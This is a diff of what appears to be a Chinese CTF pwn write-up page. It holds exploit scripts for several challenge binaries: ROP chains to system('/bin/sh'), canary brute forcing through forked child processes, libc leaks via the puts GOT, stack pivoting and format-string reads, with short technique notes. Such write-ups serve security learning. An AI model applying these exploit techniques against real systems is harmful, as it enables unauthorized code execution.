-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -947,29 +961,29 @@ rl = lambda x : p.recvline()[:x]
 s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 def cmd(s):
     sla(&quot;5.Exit\n&quot;,s)
-def insert(i,s,c=&#39;\0&#39;):
-    cmd(b&#39;1&#39;)
+def insert(i,s,c='\0'):
+    cmd(b'1')
     sla(&quot;Index:\n&quot;,itob(i))
     sla(&quot;Size:\n&quot;,itob(s))
     sa(&quot;Data:\n&quot;,c)
 
 def erase(i):
-    cmd(b&#39;2&#39;)
+    cmd(b'2')
     sla(&quot;Index:\n&quot;,itob(i))
 
-def edit(i,c=&#39;\0&#39;):
-    cmd(b&#39;3&#39;)
+def edit(i,c='\0'):
+    cmd(b'3')
     sla(&quot;Index:\n&quot;,itob(i))
     sa(&quot;Data:\n&quot;,c)
 
 def show(i):
-    cmd(b&#39;4&#39;)
+    cmd(b'4')
     sla(&quot;Index:\n&quot;,itob(i))
 # Your exploit here
-ru(&quot;&#39;0&#39; is goal&quot;)
+ru(&quot;'0' is goal&quot;)
 pay = &quot;ddwwwwddddddsssdddwwwdsssasdd&quot; + 3* &quot;wddsawaasd&quot;
 sl(pay)
 
@@ -979,13 +993,13 @@ pop_rdi_ret = 0x40264C
 system = 0x402658
 ret = 0x40265F
 pay = flat([
-    b&#39;a&#39;*0x10,
+    b'a'*0x10,
     bss,
     read_addr,
 ])
 sa(&quot;Congratulations to you!Give u a chance to sh\n&quot;,pay)
 pay = flat([
-    b&#39;a&#39;*0x10,
+    b'a'*0x10,
     bss + 0x200,
     pop_rdi_ret,
     bss + 0x20,
@@ -997,13 +1011,14 @@ pause()
 s(pay)
 ia()
 </code></pre>
-<h3 id="弥达斯之触"><a href="#弥达斯之触" class="headerlink" title="弥达斯之触"></a>弥达斯之触</h3><p>hyw</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="弥达斯之触">弥达斯之触</h3>
+<p>hyw</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-21 20:15:04
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;midas_patched&quot;
@@ -1015,17 +1030,17 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 b printf
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -1039,12 +1054,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -1054,10 +1069,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -1071,26 +1086,26 @@ rl = lambda x : p.recvline()[:x]
 s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 def cmd(s):
     sla(&quot;5.Exit\n&quot;,s)
-def insert(i,s,c=&#39;\0&#39;):
-    cmd(b&#39;1&#39;)
+def insert(i,s,c='\0'):
+    cmd(b'1')
     sla(&quot;Index:\n&quot;,itob(i))
     sla(&quot;Size:\n&quot;,itob(s))
     sa(&quot;Data:\n&quot;,c)
 
 def erase(i):
-    cmd(b&#39;2&#39;)
+    cmd(b'2')
     sla(&quot;Index:\n&quot;,itob(i))
 
-def edit(i,c=&#39;\0&#39;):
-    cmd(b&#39;3&#39;)
+def edit(i,c='\0'):
+    cmd(b'3')
     sla(&quot;Index:\n&quot;,itob(i))
     sa(&quot;Data:\n&quot;,c)
 
 def show(i):
-    cmd(b&#39;4&#39;)
+    cmd(b'4')
     sla(&quot;Index:\n&quot;,itob(i))
 # Your exploit here
 
@@ -1098,13 +1113,14 @@ sl(&quot;%7$s&quot;)
 # 何意味？何意味？何意味？何意味？何意味？
 ia()
 </code></pre>
-<h3 id="那耳喀索斯"><a href="#那耳喀索斯" class="headerlink" title="那耳喀索斯"></a>那耳喀索斯</h3><p>子进程可以用来爆 canary。</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="那耳喀索斯">那耳喀索斯</h3>
+<p>子进程可以用来爆 canary。</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-18 22:09:40
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;narcissus&quot;
@@ -1116,7 +1132,7 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 b *0x401682
 set follow-fork-mode parent
@@ -1124,10 +1140,10 @@ set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.11
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/glibc-source_2.35-0ubuntu3.11_all/usr/src/glibc/glibc-2.35
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -1141,12 +1157,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -1156,10 +1172,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -1173,30 +1189,30 @@ r = lambda x : p.recv(x)
 s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 pop_rdi_ret = 0x401340
 ret = 0x401341
 # 不断溢出 1 byte 爆破子进程直到爆完 8 bytes.
 bss = 0x4040A0 + 0xa00
-pay = b&#39;a&#39;*0x28 + b&#39;\x00&#39;
+pay = b'a'*0x28 + b'\x00'
 for i in range(2,9):
     for j in range(0,8):
         sa(&quot;我无法离开这里...\n&quot;,pay + bytes([j]))
         get = p.recvline().decode()
         print(get)
         if &quot;smashing&quot; in get:
-            sla(&quot;你在湖中看见了什么？\n&quot;,b&#39;sb&#39;)
+            sla(&quot;你在湖中看见了什么？\n&quot;,b'sb')
             continue
         pay = pay + bytes([j])
-        sl(b&#39;sb&#39;)
+        sl(b'sb')
         break
 canary = u64_ex(pay[0x28:])
 
-sla(&quot;我无法离开这里...\n&quot;,b&#39;sb&#39;)
-puts_got_addr = elf.got[&#39;puts&#39;]
+sla(&quot;我无法离开这里...\n&quot;,b'sb')
+puts_got_addr = elf.got['puts']
 puts_addr = 0x401615
 pay = flat([
-    (&quot;你的爱人...&quot;.encode()).ljust(0x18,b&#39;\0&#39;),
+    (&quot;你的爱人...&quot;.encode()).ljust(0x18,b'\0'),
     canary,
     bss,
     pop_rdi_ret,
@@ -1207,7 +1223,7 @@ sla(&quot;你在湖中看见了什么？&quot;,pay)
 ru(&quot;我明白了\n&quot;)
 libc_addr = u64_ex(r(6)) - 0x80e50
 pay = flat([
-    (&quot;你的爱人...&quot;.encode()).ljust(0x18,b&#39;\0&#39;),
+    (&quot;你的爱人...&quot;.encode()).ljust(0x18,b'\0'),
     canary,
     bss,
     pop_rdi_ret,
@@ -1217,7 +1233,7 @@ pay = flat([
 system = libc_addr + 0x50d70
 
 pay = flat([
-    (&quot;你的爱人...&quot;.encode()).ljust(0x18,b&#39;\0&#39;),
+    (&quot;你的爱人...&quot;.encode()).ljust(0x18,b'\0'),
     canary,
     bss+0x100,
     pop_rdi_ret,
@@ -1232,14 +1248,16 @@ p.success(hex(canary))
 p.success(hex(libc_addr))
 ia()
 </code></pre>
-<h2 id="Week4"><a href="#Week4" class="headerlink" title="[Week4]"></a>[Week4]</h2><h3 id="cpcp"><a href="#cpcp" class="headerlink" title="cpcp"></a>cpcp</h3><p>只要 [rbp-buf,rbp-buf+s] 能覆盖到 ret 时的 rsp 的位置，就能拿到控制流。</p>
+<h2 id="Week4">[Week4]</h2>
+<h3 id="cpcp">cpcp</h3>
+<p>只要 [rbp-buf,rbp-buf+s] 能覆盖到 ret 时的 rsp 的位置，就能拿到控制流。</p>
 <p>所以 call read 是可以利用的（</p>
-<pre><code class="python">#!/usr/bin/env python3
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-27 23:44:39
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;pwn_patched&quot;
@@ -1251,16 +1269,16 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 # b *0x401473
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/libc6-dbg_2.35-0ubuntu3.11_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/glibc-source_2.35-0ubuntu3.11_all/usr/src/glibc/glibc-2.35
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -1274,12 +1292,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -1289,10 +1307,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -1307,7 +1325,7 @@ s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
 su = lambda x : p.success(x)
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 def cmd(s):
     sla(&quot;&gt; &quot;,s)
 
@@ -1321,36 +1339,36 @@ pop_rdi_ret = 0x4013a5
 pop_rbp_ret = 0x40127d
 puts_addr = 0x401110
 for _ in range(5 + 12 + 1):
-    cmd(b&#39;1&#39;)
+    cmd(b'1')
 
 for _ in range(5):
-    cmd(b&#39;1&#39;)
+    cmd(b'1')
 read_addr = 0x401462
 pay = flat([
-    b&#39;\0&#39;*0x78,
+    b'\0'*0x78,
     read_addr,
 ])
 write(pay)
 cmd(b&quot;end&quot;)
 cmd(b&quot;1&quot;)
 pay = flat([
-    b&#39;a&#39;*0x68,
+    b'a'*0x68,
     pop_rdi_ret,
     elf.got[&quot;puts&quot;],
     puts_addr,
     read_addr
 ])
 # pause()
-# ru(&quot;Plz don&#39;t forget again!\n&quot;)
+# ru(&quot;Plz don't forget again!\n&quot;)
 # sleep(1)
-sa(b&quot;Plz don&#39;t forget again!&quot;,pay)
+sa(b&quot;Plz don't forget again!&quot;,pay)
 rl(-1)
 libc_addr = u64_ex(r(6))-0x80e50
 bin_sh = libc_addr + 0x1d8678
 system = libc_addr + 0x50d70
 pay = flat([
-    b&#39;a&#39;*0x68,
-    b&#39;a&#39;*0x18,
+    b'a'*0x68,
+    b'a'*0x18,
     pop_rdi_ret,
     bin_sh,
     system
@@ -1360,13 +1378,14 @@ s(pay)
 su(hex(libc_addr))
 ia()
 </code></pre>
-<h3 id="heap-heap"><a href="#heap-heap" class="headerlink" title="heap?heap!"></a>heap?heap!</h3><p>简单堆</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="heap-heap">heap?heap!</h3>
+<p>简单堆</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-25 10:01:35
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;code_patched&quot;
@@ -1378,17 +1397,17 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 b free
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/libc6-dbg_2.31-0ubuntu9.17_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/glibc-source_2.31-0ubuntu9.17_all/usr/src/glibc/glibc-2.31
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -1402,12 +1421,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -1417,10 +1436,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -1435,25 +1454,25 @@ s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
 su = lambda x : p.success(x)
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 def cmd(s):
     sla(&quot;&gt;&gt; &quot;,s)
-def insert(i,s,c=&#39;\0&#39;):
-    cmd(b&#39;1&#39;)
+def insert(i,s,c='\0'):
+    cmd(b'1')
     sla(&quot;Index &gt;&gt; &quot;,itob(i))
     sla(&quot;Size &gt;&gt; &quot;,itob(s))
 
 def erase(i):
-    cmd(b&#39;2&#39;)
+    cmd(b'2')
     sla(&quot;Index &gt;&gt; &quot;,itob(i))
 
-def edit(i,c=&#39;\0&#39;):
-    cmd(b&#39;4&#39;)
+def edit(i,c='\0'):
+    cmd(b'4')
     sla(&quot;Index &gt;&gt; &quot;,itob(i))
     sa(&quot;Content &gt;&gt; &quot;,c)
 
 def show(i):
-    cmd(b&#39;3&#39;)
+    cmd(b'3')
     sla(&quot;Index &gt;&gt; &quot;,itob(i))
 # Your exploit here
 
@@ -1481,13 +1500,14 @@ su(hex(libc_addr))
 su(hex(system))
 ia()
 </code></pre>
-<h3 id="key-的大冒险-2"><a href="#key-的大冒险-2" class="headerlink" title="key 的大冒险(2)"></a>key 的大冒险(2)</h3><p>只溢出到 rsp 可以栈迁移；只溢出到 rbp 可以任意地址写特定数值。</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="key-的大冒险-2">key 的大冒险(2)</h3>
+<p>只溢出到 rsp 可以栈迁移；只溢出到 rbp 可以任意地址写特定数值。</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-25 10:34:11
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;103300_adventure2&quot;
@@ -1499,17 +1519,17 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 # b *0x401B02
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6-dbg_2.31-0ubuntu9.18_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/glibc-source_2.31-0ubuntu9.18_all/usr/src/glibc/glibc-2.31
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -1523,12 +1543,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -1538,10 +1558,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -1556,7 +1576,7 @@ s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
 su = lambda x : p.success(x)
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 def cmd(s):
     sla(&quot;Choose an option: &quot;,s)
 def buy(i):
@@ -1564,11 +1584,11 @@ def buy(i):
     sla(&quot;Enter the number of the item you want to buy (1-3): \n&quot;,itob(i))
 
 def sell(i):
-    cmd(b&#39;5&#39;)
+    cmd(b'5')
     sla(&quot;Enter the number of the item you want to sell (1-3): \n&quot;,itob(i))
 
 def equip(i):
-    cmd(b&#39;6&#39;)
+    cmd(b'6')
     sla(&quot;Enter the number of the item you want to equip (1-3): \n&quot;,itob(i))
 for _ in range(5):
     buy(3)
@@ -1580,7 +1600,7 @@ for _ in range(2):
 money = 0x40409C
 equip(3)
 pay = flat([
-    b&#39;a&#39;*0x40,
+    b'a'*0x40,
     money+0x10
 ])
 sa(&quot;You want to say something to the village chief: \n&quot;,pay)
@@ -1591,7 +1611,7 @@ for _ in range(0x19):
     buy(3)
 
 pay = flat([
-    b&#39;a&#39;*0x40,
+    b'a'*0x40,
     money+0x10,
     0x401533
 ])
@@ -1599,13 +1619,14 @@ equip(3)
 sa(&quot;You want to say something to the village chief: \n&quot;,pay)
 ia()
 </code></pre>
-<h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><p>fileno &#x3D; 0 会从标准输入读，而输入的数据又会先拷贝到缓冲区。</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="magic">magic</h3>
+<p>fileno = 0 会从标准输入读，而输入的数据又会先拷贝到缓冲区。</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-28 15:59:30
-&#39;&#39;&#39;
+'''
 from pwncli import *
 filename = &quot;154333_io&quot;
 libcname = &quot;/home/yoisaki_kanade/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/libc6_2.39-0ubuntu8.5_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;
@@ -1616,7 +1637,7 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 # b read
 # b *0x401825
@@ -1624,10 +1645,10 @@ set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.39-0ubuntu8.5/
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/glibc-source_2.39-0ubuntu8.5_all/usr/src/glibc/glibc-2.39
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -1641,12 +1662,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -1656,10 +1677,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -1722,18 +1743,19 @@ s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
 su = lambda x : p.success(x)
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
